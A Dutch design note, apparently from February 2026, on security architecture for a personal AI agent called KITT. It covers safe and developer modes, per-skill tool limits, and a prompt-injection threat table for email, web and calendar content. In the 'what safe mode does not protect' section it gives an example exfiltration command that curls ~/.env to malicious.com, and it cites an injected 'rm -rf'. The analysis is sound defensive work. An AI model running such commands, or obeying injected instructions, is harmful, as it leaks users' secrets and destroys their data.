# Safe Mode vs Developer Mode — Agent Architecture

> Brainstorm sessie 13 februari 2026
> Context: KITT-185 (Agent Reliability) afgerond, nu dieper nadenken over security en efficiency

---

## Aanleiding

KITT heeft structurele problemen met hoe background agents draaien:

1. **40K system prompt voor elke background agent** — Identity, soul, humor, user info, skills catalog, transcripts laden voor een simpele Garmin query
2. **Alle 8 tools beschikbaar voor elke background agent** — Haiku met Bash/Write/Edit is een security risico
3. **Memory-search draait als full agent (88s)** terwijl `memory.search()` een directe vector query is (~200-500ms)
4. **Geen "background" context mode** — Alleen `chat` en `think`, background tasks gebruiken `chat` mode

---

## Het Safe Mode / Developer Mode Model

### Kernidee

**Safe mode:** Bestaande skills werken normaal (inclusief Bash), maar er kan NIKS nieuws aangemaakt worden. Geen nieuwe skills, geen nieuwe scripts, geen nieuwe files buiten wat skills zelf doen.

**Developer mode:** Alles mag. Nieuwe skills aanmaken, volledige toegang. Schakel je aan via de Portal als je wilt bouwen, en daarna weer terug naar safe mode.

### Waarom dit werkt

Het security risico is niet dat bestaande skills Bash gebruiken — die zijn pre-approved en whitelisted in de capabilities tabel. Het risico is:

1. **Prompt injection** die Haiku instrueert om een malicious bash command uit te voeren
2. **Prompt injection** die een nieuwe skill aanmaakt met malicious bash commands erin
3. **User error** — gebruiker die per ongeluk iets gevaarlijks triggert

Safe mode lost dit op:
- Chat agent (Opus) heeft al geen tools (`allowedTools: []`)
- Skills draaien met hun eigen declared tools (via capabilities tabel)
- Nieuwe skills/files aanmaken is geblokkeerd
- Write naar `.claude/skills/` is geblokkeerd

### Enforcement punten

```
SAFE MODE:
├── Chat (Opus) → geen tools (al zo)
├── Classifier (Haiku) → geen tools (alleen tekst classificatie)
├── Bestaande skills → werken normaal, inclusief Bash
│   (pre-approved, staan in capabilities tabel)
├── Nieuwe skills aanmaken → GEBLOKKEERD
├── Write naar .claude/skills/ → GEBLOKKEERD
└── Think loop → Read/Grep alleen (geen Bash, geen Write)

DEVELOPER MODE:
├── Alles hetzelfde als safe mode, plus:
├── Nieuwe skills aanmaken → TOEGESTAAN
├── Write naar .claude/skills/ → TOEGESTAAN
└── Think loop → Alle tools
```

### Mode opslag

Simpel veld in de `meta` tabel: `agent_mode = 'safe' | 'developer'`
Schakelbaar via Portal UI.

---

## Self-Sufficient Skills

### Principe

Skills halen zelf op wat ze nodig hebben. De SKILL.md is hun handleiding. Daardoor hoeft de background runner geen 40K system prompt mee te geven.

### Voorbeeld: Blog Writer

De blog writer skill haalt nu al zelf op:
- Blog index (`_blog/index.json`)
- Zelfreflectie van vandaag
- **Moet toevoegen:** Transcripts van de laatste dag (voor context)

Als de skill z'n eigen context ophaalt, hoeft de background runner alleen:
- SKILL.md instructies
- Basis gedragsinstructies ("antwoord in het Nederlands", "wees kort")
- User info (wie is Renier — relevant voor personalisatie)
- De tools die hij mag gebruiken (op basis van mode + capability)

### Impact op system prompt

Background agents gaan van ~40K → ~5-10K chars. De rest haalt de skill zelf op via Read/Grep tools.

---

## Capabilities Tabel als Orchestrator

De capabilities tabel is het controle-dashboard. Per skill definieert het:

| Veld | Wat het bepaalt | Voorbeeld |
|------|----------------|-----------|
| id | Welke skill | `garmin` |
| triggers | Wanneer classifier het herkent | `["slaap", "stappen", "hrv"]` |
| model | Welk AI model | `haiku` of `opus` |
| execution | Hoe het draait | `background`, `inline`, `direct` |
| modes | In welke KITT mode beschikbaar | `["safe", "developer"]` of `["developer"]` |
| allowed_tools | Wat de skill mag | `["Bash", "Read", "Glob", "Grep"]` |

### Execution modes

| Mode | Gedrag | Voorbeeld |
|------|--------|-----------|
| `direct` | Tool binnen chat agent | — |
| `background` | Agent spawned async | Garmin, Gmail, LinkedIn |
| `inline` | Directe functie-aanroep, geen agent | Memory search |

---

## Tools Overzicht

Agent SDK tools zijn onafhankelijk van Bash:

| Tool | Wat het doet | Bash nodig? |
|------|-------------|-------------|
| Read | File openen en lezen | Nee |
| Glob | Files zoeken op naam/patroon | Nee |
| Grep | Zoeken IN files op inhoud | Nee |
| Write | Nieuwe file aanmaken | Nee |
| Edit | Bestaande file bewerken | Nee |
| WebSearch | Internet zoeken | Nee |
| WebFetch | Webpagina ophalen | Nee |
| Bash | Willekeurig commando uitvoeren | — |

### Wat skills Bash voor gebruiken

- **API calls** — curl, scripts die APIs aanroepen (Garmin, Gmail, Nango)
- **Database queries** — sqlite3 commands
- **Git** — git push (blog publisher)
- **System commands** — pm2, npm
- **Browser automation** — Playwright scripts

### Alternatief: API wrappers

Sommige skills (zoals Notion) hebben al TypeScript API wrappers (`notion-api.ts`). Dit patroon elimineert de Bash dependency. Maar dat is een grotere refactor per skill.

---

## Routering — Per Use Case

### Chat (gewoon praten)
```
User → Classifier (Haiku) → "direct" → Opus (geen tools, volledige context) → antwoord
```

### Garmin / Gmail (data ophalen)
```
User → Classifier → "background → garmin" → ack → Background agent (Haiku, Bash+Read) → resultaat
```

### Memory Search (herinneringen)
```
User → Classifier → "background → memory-search" → ack → INLINE: directe vector query → <1s
```

### LinkedIn / Blog (content creatie)
```
User → Classifier → "background → linkedin-post" → ack → Background agent (Opus, alle tools) → resultaat
```

---

## Security Analyse — Tool-gevaarlijkheid

| Tool | Read-only | Gevaarlijk bij prompt injection | Waarom |
|------|-----------|--------------------------------|--------|
| Read | Ja | Nee | Leest alleen files |
| Glob | Ja | Nee | Zoekt alleen filenames |
| Grep | Ja | Nee | Zoekt alleen in files |
| WebSearch | Ja | Nee | Zoekt alleen op internet |
| WebFetch | Ja | Nee | Leest alleen webpagina's |
| **Bash** | **Nee** | **JA** | Kan ALLES: files schrijven, commands, data exfiltreren |
| **Write** | **Nee** | **JA** | Kan nieuwe files aanmaken (bijv. malicious skill) |
| **Edit** | **Nee** | **JA** | Kan bestaande files wijzigen |

---

## User Scenario's — Wat kan de user in welke mode?

| Wat de user vraagt | Hoe het draait | Skill? | Safe mode | Developer mode |
|--------------------|---------------|--------|-----------|----------------|
| "Hoe gaat het?" | Chat → Opus (geen tools) | Nee | ✅ Werkt | ✅ Werkt |
| "Wat heb ik gisteren gegeten?" | Chat → Opus (geen tools, memory in context) | Nee | ✅ Werkt | ✅ Werkt |
| "Check mijn slaap" | Classifier → Background (Haiku + garmin skill, Bash) | Ja: garmin | ✅ Werkt | ✅ Werkt |
| "Heb ik nieuwe mail?" | Classifier → Background (Haiku + gmail skill, Bash) | Ja: gmail | ✅ Werkt | ✅ Werkt |
| "Zoek in mijn geheugen naar X" | Classifier → Inline (directe vector query) | Nee | ✅ Werkt (<1s) | ✅ Werkt (<1s) |
| "Lees deze URL: https://..." | Chat → Opus (geen tools) → kan URL NIET lezen | Nee | ❌ Kan niet¹ | ❌ Kan niet¹ |
| "Schrijf een LinkedIn post" | Classifier → Background (Opus + linkedin skill, alle tools) | Ja: linkedin | ✅ Werkt | ✅ Werkt |
| "Schrijf een blog" | Classifier → Background (Opus + blog skill, alle tools) | Ja: blog | ✅ Werkt | ✅ Werkt |
| "Maak een nieuwe skill voor X" | Developer flow → Write naar .claude/skills/ | Nee | ❌ BLOCKED | ✅ Werkt |
| "Edit de garmin skill" | Developer flow → Edit in .claude/skills/ | Nee | ❌ BLOCKED | ✅ Werkt |
| "Run dit bash command: ..." | Chat → Opus (geen tools) → kan het niet | Nee | ❌ Kan niet² | ❌ Kan niet² |

¹ **URL lezen:** Optie A (web-reader skill met alleen WebFetch, geen Bash) is de beste oplossing — veilig in beide modes.

² **Direct bash:** Chat agent heeft geen tools, werkt nooit via chat. Alleen via skills die Bash declareren.

---

## Prompt Injection Scenario's — Waar stopt het?

| Aanvalsvector | Pad | Safe mode | Developer mode |
|---------------|-----|-----------|----------------|
| **Malicious tekst in chat** | User → Classifier → Opus (geen tools) | ✅ STOPT: Opus kan niks uitvoeren | ✅ STOPT: Zelfde |
| **Malicious link in chat** | User → Classifier → Opus (geen tools) | ✅ STOPT: Opus kan geen URLs openen | ✅ STOPT: Zelfde |
| **Injection in email** → "run rm -rf" | Gmail skill → Haiku leest email → injection | ⚠️ RISICO: Haiku heeft Bash. Mitigatie: SKILL.md + per-skill tool beperking | ⚠️ ZELFDE RISICO |
| **Injection in email** → "maak een skill" | Gmail skill → Haiku → probeert Write | ✅ STOPT: Write naar .claude/skills/ geblokkeerd | ⚠️ RISICO: Write is toegestaan |
| **Injection in webpagina** | Browser skill → leest page → injection | ⚠️ RISICO: Als skill Bash heeft | ⚠️ ZELFDE RISICO |
| **Injection in Notion page** | Notion skill → TypeScript API wrapper | ✅ BEPERKT: Geen Bash, alleen Notion API | ✅ ZELFDE |
| **Injection in calendar event** | Calendar skill → leest event → injection | ⚠️ RISICO: Als skill Bash heeft | ⚠️ ZELFDE RISICO |

### Wat Safe Mode WEL beschermt

1. **Geen persistente aanvallen** — Prompt injection kan GEEN nieuwe skill aanmaken die bij elke reboot draait
2. **Geen skill code wijzigen** — Bestaande skills kunnen niet gemodificeerd worden
3. **Chat agent is veilig** — Opus zonder tools kan niks uitvoeren

### Wat Safe Mode NIET beschermt

1. **One-time Bash exploits** — Als een skill Bash heeft en injection door SKILL.md breekt, kan het eenmalig een command uitvoeren
2. **Data exfiltratie** — Via Bash: `curl malicious.com?data=$(cat ~/.env)`

### De verdedigingslagen (gestapeld)

| Laag | Bescherming |
|------|------------|
| 1. Chat agent | Geen tools → prompt injection via chat is machteloos |
| 2. Classifier | Routeert alleen naar bekende capabilities |
| 3. SKILL.md instructies | Agent weet exact wat te doen → injection moet dit overriden |
| 4. Per-skill tool restrictions | Alleen tools die de skill nodig heeft |
| 5. Safe mode: geen Write naar skills/ | Voorkomt persistente backdoors |
| 6. Per-skill Bash sandboxing (toekomst) | Specifieke commands per skill |

---

## Open Vragen

1. **Think loop in safe mode** — Welke tools krijgt de think loop? Read/Grep lijkt voldoende, maar sommige tasks starten skills die Bash nodig hebben
2. **Opus BACKGROUND_TASK signal** — In safe mode, moet dit beperkt worden tot bestaande capabilities? (ja, denk ik)
3. **Folder restrictions** — Moet Write beperkt worden tot `profile/` in safe mode? Of is "geen nieuwe skills" voldoende?
4. **Skills zelfvoorzienend maken** — Welke skills moeten eerst aangepast worden? Blog writer mist transcripts context.

---

## Volgende Stappen (goedgekeurd 13 feb 2026)

- [x] Memory search inline maken (88s → ~10s) — done 13 feb
- [x] Per-capability allowed_tools in capabilities tabel — done 13 feb
- [x] Background context mode (40K → 11K) — done 13 feb
- [x] 3-phase memory search met query planner (Haiku → search → Opus synthesis) — done 13 feb
- [ ] Safe/developer mode enforcement in meta tabel + Portal toggle (later)
- [ ] Skills auditen op zelfvoorziendheid (later)

### Geteste user flows (13 feb)

| Flow | Status |
|------|--------|
| Chat (Opus, geen tools) | Pass |
| Memory in context (recent) | Pass |
| Garmin (data fetch, Haiku + Bash) | Pass |
| Gmail (data fetch, Haiku + Bash) | Pass |
| Memory search (3-phase inline) | Pass |
| LinkedIn / Blog (content creation) | Niet getest |
